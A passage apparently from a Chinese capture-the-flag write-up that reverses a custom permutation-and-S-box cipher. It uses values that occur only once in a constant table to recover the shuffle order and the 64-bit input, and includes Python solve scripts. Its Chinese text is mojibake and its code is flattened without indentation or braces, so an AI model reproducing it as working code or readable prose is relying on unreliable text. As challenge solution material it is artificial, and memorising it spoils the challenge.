0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x0000004D, 0x0000006C, 0x00000074, 0x00000076, 0x0000007A, 0x000000A9, 0x000000AE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000000, 0x0000000C, 0x00000017, 0x0000001E, 0x00000024, 0x00000027, 0x00000064, 0x00000067, 0x000000CC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x0000003D, 0x00000084, 0x00000085, 0x000000CD, 0x000000EB, 0x000000F8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000057, 0x00000084, 0x0000008A, 0x000000B6, 0x000000CD, 0x000000E9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x00000021, 0x0000002E, 0x0000003B, 0x00000073, 0x00000074, 0x000000A0, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000021, 0x00000033, 0x00000037, 0x00000067, 0x00000072, 0x000000A1, 0x000000CA, 0x000000E1, 0x000000FB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000023, 0x00000038, 0x00000047, 0x00000048, 0x0000004B, 0x0000004C, 0x00000057, 0x00000059, 0x00000069, 0x00000090, 0x000000A0, 0x000000BA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000031, 0x00000035, 0x0000003C, 0x00000093, 0x000000A1, 0x000000DE, 0x000000EE, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000066, 0x0000008C, 0x00000091, 0x00000094, 0x000000A0, 0x000000B0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000040, 0x0000007A, 0x00000096, 0x000000A4, 0x000000E0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000030, 0x0000003D, 0x0000005A, 0x0000006C, 0x00000080, 0x000000E6, 0x000000ED, 0x000000F2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000004, 0x00000019, 0x00000082, 0x00000088, 0x00000090, 0x00000094, 0x000000AC, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000022, 0x00000028, 0x0000003C, 0x0000006E, 0x00000079, 0x0000007E, 0x0000008E, 0x00000091, 0x00000099, 0x0000009D, 0x000000A0, 0x000000CC, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x00000033, 0x00000082, 0x0000008C, 0x00000090, 0x000000AA, 0x000000BC, 0x000000F8, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000017, 0x00000049, 0x00000093, 0x000000C7, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000019, 0x00000047, 0x0000005B, 0x00000060, 0x00000065, 0x000000BD, 0x000000F2, 0x000000F5, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000020, 0x0000002B, 0x00000031, 0x00000047, 0x00000048, 0x00000051, 0x00000054, 0x00000064, 0x00000078, 0x000000A1, 0x000000A5, 0x000000B4, 0x000000C8, 0x000000EE, 0x000000FE, 0x00000005, 0x00000011, 0x0000004A, 0x0000005D, 0x00000076, 0x00000077, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x0000006D, 0x0000009A, 0x000000A3, 0x000000CE, 0x000000DC, 0x000000E0, 0x000000E4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x0000001D, 0x0000003A, 0x00000046, 0x00000098, 0x0000009C, 0x000000E7, 0x000000F3, 0x000000F5, 0x000000F8, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001E, 0x00000034, 0x0000003B, 0x00000046, 0x00000079, 0x000000A7, 0x000000B0, 0x000000C4, 0x000000E0, 0x000000E7, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000070, 0x00000087, 0x00000097, 0x0000009E, 0x000000A6, 0x000000FB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001C, 0x00000021, 0x0000002B, 0x00000039, 0x0000004A, 0x0000006C, 0x00000081, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000006, 0x00000041, 0x00000064, 0x0000007F, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000020, 0x00000022, 0x0000005C, 0x000000B0, 0x000000B6, 0x000000B9, 0x000000C2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000014, 0x0000001E, 0x00000079, 0x00000092, 0x00000096, 0x000000BC, 0x000000C7, 0x000000DA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000016, 0x00000046, 0x0000007D, 0x00000089, 0x000000D5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000043, 0x0000004C, 0x0000006A, 0x0000007D, 0x0000007F, 0x0000008D, 0x000000C2, 0x000000F2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000029, 0x00000045, 0x00000051, 0x00000069, 0x00000091, 0x000000B6, 0x000000EA, 0x000000F5, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000011, 0x00000036, 0x00000038, 0x00000040, 0x0000005C, 0x00000099, 0x000000D1, 0x000000E9, 0x000000EE, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000004B, 0x00000058, 0x00000071, 0x00000084, 0x000000C6, 0x000000F3, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF]arr = np.zeros((4, 21, 15))for m in range(4): for n in range(21): for p in range(15): arr[m][n][p] = _arr[(21 * m + n) * 15 + p]arr = np.array(_arr).reshape((4, 21, 15))round = 0S = list(range(256))flag = [0x3132333435360a00, 0, 0, 0]# å‘ç¨‹åºè¾“å…¥ 123456, åŠ¨è°ƒ dump å‡ºçš„ flag çš„å€¼for round in range(4): order = list(range(21)) n = 20 bignum = math.factorial(n) # 20 çš„é˜¶ä¹˜ï¼Œå³ 0x21C3677C82B40000 index = 0 while n: quot = index + flag[round] // bignum flag[round] %= bignum order[quot], order[index] = order[index], order[quot] bignum //= n index += 1 n -= 1 for i in range(21): for j in range(15): if arr[round][order[i]][j] != 0xFFFFFFFF: S[int(arr[round][order[i]][j])] += iwith open('../cipher-release', 'rb') as f: src = f.read() src = list(src)with open('output', 'rb') as f:#ä»¥ 123456 ä½œä¸ºè¾“å…¥å¾—åˆ°çš„ output æ–‡ä»¶ final = f.read() final = list(final)for i in range(256): assert (S[i] &amp; 0xff == final[src.index(i)])ä¹ä¸€çœ‹ä¼¼ä¹æ²¡æœ‰å¯é€†çš„ç‚¹ï¼Œè¿™ shuffle æ•°æ®æ··æ´—çš„è¿™ä¹ˆä¸¥é‡è¦æ€ä¹ˆé€†å‘ï¼Ÿ ä½†æ˜¯æƒ³æƒ³é¢å¯¹éš¾ä»¥é€†å‘çš„ç®—æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªç®—æ³•å¿…å®šåœ¨å¯†ç å­¦ä¸Šæ˜¯æœ‰æ¼æ´å­˜åœ¨çš„ï¼Œå¦åˆ™çœŸå°±æ²¡äººåšå¾—å‡ºæ¥äº† è¿™é‡Œéœ€è¦æ³¨æ„ arr è¿™ä¸ªè¶…å¤§çš„å¸¸æ•°æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„çš„å”¯ä¸€ä¼šæ”¹å˜ S ç›’çš„å€¼çš„å˜é‡ï¼Œä½†æ˜¯å½“ arr çš„å€¼ç­‰äº 0xFFFFFFFF æ—¶ï¼Œæ˜¯ä¸ä¼šå¯¹ Sç›’ ä¸­æ•°æ®çš„å€¼åšå‡ºæ›´æ”¹çš„ï¼Œå¹¶ä¸”æˆ‘ä»¬çœ‹ä¸€ä¸‹èµ‹å€¼è¯­å¥ S[int(arr[round][order[i]][j])] += i , arr çš„å€¼ä¼šè®© S ç›’å¯¹åº”ä½ç½®ä¸Šçš„å€¼ +i å¦‚æœ S ç›’ä¸ŠåŒä¸€ä½ç½®çš„å€¼è¿ç»­åŠ ä¸¤æ¬¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šæ˜¯ä¸çŸ¥é“è¿™ä¸¤æ¬¡åˆ†åˆ«åŠ äº†å“ªä¸¤ä¸ªæ•° ä½†æ˜¯ï¼Œè¦æ˜¯ S ç›’ä¸ŠåŒä¸€ä½ç½®çš„å€¼åªåŠ ä¸€æ¬¡å‘¢ï¼Ÿæœ€ç»ˆçš„å€¼å’Œå¼€å§‹çš„å€¼å‡ä¸€å‡ï¼Œä¸å°±çŸ¥é“ +i åŠ çš„æ•°ä»€ä¹ˆäº†å— æˆ‘ä»¬å†™ä¸ªå°è„šæœ¬çœ‹çœ‹ arr ä¸­æœ‰å¤šå°‘æ•°å­—åªå‡ºç°è¿‡ä¸€æ¬¡ _arr=[...]# æ•°ç»„å¤ªå¤§æˆ‘å°±çœç•¥å•¦ï¼Œå€¼å’Œä¸Šé¢çš„æ˜¯ä¸€æ ·çš„dict = &#123;&#125;for key in _arr: if key==0xffffffff: key = \"0x-1\" else: key = \"0x\"+hex(key)[2::].zfill(2) dict[key] = dict.get(key, 0) + 1print(dict)è¾“å‡ºä¸º &#123;'0x2a': 2, '0x5b': 4, '0x7e': 3, '0xc1': 1, '0xdc': 3, '0x-1': 663, '0x2c': 1, '0x59': 4, '0x6f': 2, '0x78': 4, '0x8e': 4, '0xbd': 2, '0x01': 2, '0x04': 4, '0x0e': 1, '0x88': 3, '0x8b': 2, '0xb4': 3, '0x38': 3, '0xa6': 3, '0xae': 4, '0xc3': 2, '0xe3': 3, '0xe8': 1, '0xff': 4, '0x13': 4, '0x16': 3, '0x58': 4, '0x5d': 2, '0xbb': 1, '0x89': 3, '0x9d': 3, '0xb7': 3, '0xc5': 1, '0xc6': 2, '0xf9': 3, '0x02': 4, '0x20': 4, '0x47': 4, '0x8f': 2, '0x98': 3, '0xcc': 3, '0xdf': 1, '0x15': 4, '0x70': 3, '0xa8': 1, '0x62': 2, '0x68': 1, '0xc2': 4, '0xea': 3, '0x0a': 2, '0x0d': 2, '0x2f': 1, '0x44': 3, '0x57': 4, '0x7f': 4, '0xdb': 4, '0x0b': 1, '0x18': 2, '0x86': 4, '0xdd': 4, '0x1c': 2, '0x31': 3, '0x3d': 3, '0x40': 4, '0x97': 4, '0x9e': 2, '0xa1': 4, '0xc7': 3, '0xcd': 4, '0xe2': 1, '0xf8': 4, '0x25': 1, '0x35': 2, '0x55': 2, '0x72': 2, '0xcb': 4, '0xda': 2, '0xed': 3, '0x52': 4, '0x85': 2, '0x93': 4, '0xf0': 1, '0xa2': 1, '0xbe': 3, '0x2d': 1, '0x84': 4, '0xc4': 3, '0xd6': 2, '0xe1': 4, '0x37': 2, '0x41': 2, '0x51': 4, '0x53': 1, '0x75': 4, '0x76': 3, '0xef': 4, '0x0f': 1, '0x6b': 4, '0x9c': 2, '0x05': 2, '0x11': 3, '0x14': 3, '0x17': 4, '0x21': 4, '0x61': 1, '0x6a': 4, '0x83': 3, '0x22': 4, '0x26': 1, '0x90': 4, '0xec': 4, '0x6c': 4, '0x8c': 4, '0xf7': 1, '0x10': 1, '0x7c': 3, '0xc0': 2, '0xf3': 3, '0xf6': 3, '0x27': 3, '0xd9': 1, '0x30': 3, '0x32': 3, '0x6d': 4, '0x81': 2, '0xbf': 2, '0xfa': 1, '0x36': 3, '0x5c': 3, '0xd3': 1, '0x03': 4, '0x09': 1, '0x80': 2, '0xfc': 3, '0x1f': 1, '0x64': 4, '0xb6': 4, '0x42': 3, '0x56': 1, '0xaf': 3, '0xfd': 4, '0x45': 2, '0x4e': 1, '0xc8': 2, '0x5a': 3, '0x5f': 1, '0x96': 4, '0x0c': 4, '0xcf': 1, '0x3f': 1, '0x65': 2, '0x4f': 2, '0x50': 3, '0x63': 1, '0x00': 2, '0x9b': 1, '0xbc': 3, '0xee': 4, '0x23': 2, '0x3e': 1, '0xd4': 3, '0x33': 3, '0x46': 4, '0x7a': 3, '0xb2': 1, '0x6e': 2, '0xa5': 2, '0xa7': 2, '0xa9': 2, '0xd2': 1, '0xe5': 2, '0x91': 4, '0xb1': 1, '0xe4': 2, '0xe9': 4, '0x5e': 2, '0xb3': 1, '0xf1': 2, '0x4b': 3, '0x8d': 2, '0x95': 1, '0xb8': 2, '0x19': 3, '0xd8': 1, '0x1a': 2, '0x7b': 1, '0xb0': 4, '0xab': 1, '0xf5': 4, '0x1b': 1, '0xb5': 1, '0x07': 1, '0x1d': 2, '0x9f': 1, '0x2b': 3, '0xa3': 3, '0xd0': 1, '0x2e': 2, '0xf4': 1, '0xfe': 4, '0x12': 1, '0x79': 4, '0x99': 3, '0xce': 2, '0x7d': 3, '0xc9': 1, '0x1e': 4, '0xd7': 1, '0xad': 1, '0x08': 3, '0x4d': 1, '0x74': 2, '0x24': 1, '0x67': 2, '0xeb': 1, '0x8a': 1, '0x3b': 2, '0x73': 1, '0xa0': 4, '0xca': 1, '0xfb': 2, '0x48': 2, '0x4c': 2, '0x69': 2, '0xba': 1, '0x3c': 2, '0xde': 1, '0x66': 1, '0x94': 2, '0xa4': 1, '0xe0': 3, '0xe6': 1, '0xf2': 3, '0x82': 2, '0xac': 1, '0x28': 1, '0xaa': 1, '0x49': 1, '0x60': 1, '0x54': 1, '0x4a': 2, '0x77': 1, '0x9a': 1, '0x3a': 1, '0xe7': 2, '0x34': 1, '0x87': 1, '0x39': 1, '0x06': 1, '0xb9': 1, '0x92': 1, '0xd5': 1, '0x43': 1, '0x29': 1, '0xd1': 1, '0x71': 1&#125;çŸ¥é“äº†åŠ çš„æ•°æ˜¯ä»€ä¹ˆæœ‰ä»€ä¹ˆç”¨ï¼Ÿè¿™ä½œç”¨å¯å¤§äº†ï¼ é€šè¿‡çŸ¥é“åŠ äº†ä»€ä¹ˆæ•°ï¼Œåœ¨è¾…ä»¥ S ç›’çš„å¯¹åº”ä½ç½®ä¿¡æ¯ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºç»è¿‡ shuffle æ“ä½œä¹‹åçš„ order åºåˆ—é¡ºåº arr = np.array(_arr).reshape((4, 21, 15))S = list(range(256))with open('./cipher-release', 'rb') as f: src = f.read() src = list(src)with open('output', 'rb') as f: final = f.read() final = list(final)key = [[-1 for order in range(21)] for round in range(4)]for i in range(256): S[i] = final[src.index(i)] if len(np.argwhere(arr == i)) == 1: round, order_i, j = list(np.argwhere(arr == i)[0]) key[round][S[i] - i] = order_iéšåé€šè¿‡ order åºåˆ—ï¼Œå°±å¯ä»¥é€†å‘æ¨å‡ºæœ€å¼€å§‹è¾“å…¥çš„é•¿ä¸º 64 ä½çš„æ•°å€¼ç©¶ç«Ÿæ˜¯å¤šå°‘ï¼Œç”±æ­¤ä¾¿å¯ä»¥æ¨å‡º flag æ¥å•¦ï½ for round in range(4): order = key[round] seed = 0 pre_order = list(range(21)) for i in range(21): j = pre_order.index(order[i]) pre_order[i], pre_order[j] = pre_order[j], pre_order[i] seed += math.factorial(20 - i) * (j - i)äºæ˜¯ exp å¦‚ä¸‹ï¼Œåšå®Œè¿™é¢˜è™½ç„¶å¤‡å—æŠ˜ç£¨ï¼Œä½†ç€å®æœ‰ä¸­æŸ³æš—èŠ±æ˜åˆä¸€æ‘çš„æ„Ÿè§‰ import mathimport numpy as np_arr = [0x0000002A, 0x0000005B, 0x0000007E, 0x000000C1, 0x000000DC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002A, 0x0000002C, 0x00000059, 0x0000006F, 0x00000078, 0x0000008E, 0x000000BD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000001, 0x00000004, 0x0000000E, 0x00000088, 0x0000008B, 0x000000B4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000038, 0x000000A6, 0x000000AE, 0x000000C3, 0x000000E3, 0x000000E8, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x00000016, 0x00000058, 0x0000005D, 0x00000078, 0x000000AE, 0x000000BB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000005B, 0x00000089, 0x0000009D, 0x000000B7, 0x000000C5, 0x000000C6, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x00000016, 0x00000020, 0x00000047, 0x0000008F, 0x00000098, 0x000000CC, 0x000000DF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000070, 0x000000A8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000062, 0x00000068, 0x000000C2, 0x000000EA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000A, 0x0000000D, 0x0000002F, 0x00000044, 0x00000057, 0x0000007F, 0x000000DB, 0x000000E3, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000B, 0x00000018, 0x00000059, 0x00000086, 0x000000DD, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001C, 0x00000031, 0x0000003D, 0x00000040, 0x00000097, 0x0000009D, 0x0000009E, 0x000000A1, 0x000000C7, 0x000000CD, 0x000000E2, 0x000000F8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000A, 0x00000020, 0x00000025, 0x00000035, 0x00000044, 0x00000055, 0x00000072, 0x000000CB, 0x000000DA, 0x000000DD, 0x000000ED, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000044, 0x00000052, 0x00000085, 0x00000093, 0x000000B4, 0x000000CB, 0x000000E3, 0x000000F0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000052, 0x00000059, 0x000000A2, 0x000000BE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002D, 0x00000055, 0x0000005B, 0x00000084, 0x000000C4, 0x000000D6, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x00000037, 0x00000041, 0x00000051, 0x00000053, 0x00000075, 0x00000076, 0x000000EA, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000F, 0x00000040, 0x0000006B, 0x0000009C, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000005, 0x00000011, 0x00000014, 0x00000017, 0x00000021, 0x00000058, 0x00000061, 0x0000006A, 0x00000083, 0x000000D6, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000022, 0x00000026, 0x00000090, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000006B, 0x0000006C, 0x00000086, 0x0000008C, 0x00000093, 0x000000F7, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000010, 0x00000013, 0x0000007C, 0x000000C0, 0x000000CB, 0x000000F3, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000027, 0x0000007C, 0x0000007F, 0x00000083, 0x00000086, 0x000000D9, 0x000000DB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000030, 0x00000032, 0x0000006D, 0x00000081, 0x000000BF, 0x000000ED, 0x000000FA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000022, 0x00000030, 0x00000032, 0x00000036, 0x0000005C, 0x000000D3, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000004, 0x00000009, 0x00000014, 0x00000080, 0x0000008E, 0x00000098, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001F, 0x00000064, 0x000000B6, 0x000000C4, 0x000000DD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000042, 0x00000056, 0x0000008E, 0x000000AF, 0x000000DD, 0x000000EF, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000032, 0x00000045, 0x0000004E, 0x0000006D, 0x00000075, 0x0000008F, 0x000000C8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000018, 0x0000005A, 0x0000005F, 0x0000006B, 0x00000096, 0x000000DB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000C, 0x0000006A, 0x000000CF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x0000003F, 0x00000065, 0x000000C2, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000004F, 0x00000050, 0x00000063, 0x000000C3, 0x000000CB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000000, 0x0000009B, 0x000000BC, 0x000000EE, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000004, 0x00000023, 0x0000003E, 0x00000042, 0x00000078, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000033, 0x00000036, 0x00000046, 0x0000007A, 0x00000083, 0x000000B2, 0x000000BE, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000006E, 0x000000A5, 0x000000A6, 0x000000A7, 0x000000A9, 0x000000B7, 0x000000D2, 0x000000E5, 0xFFFFFFFF, 0xFFFFFFFF, 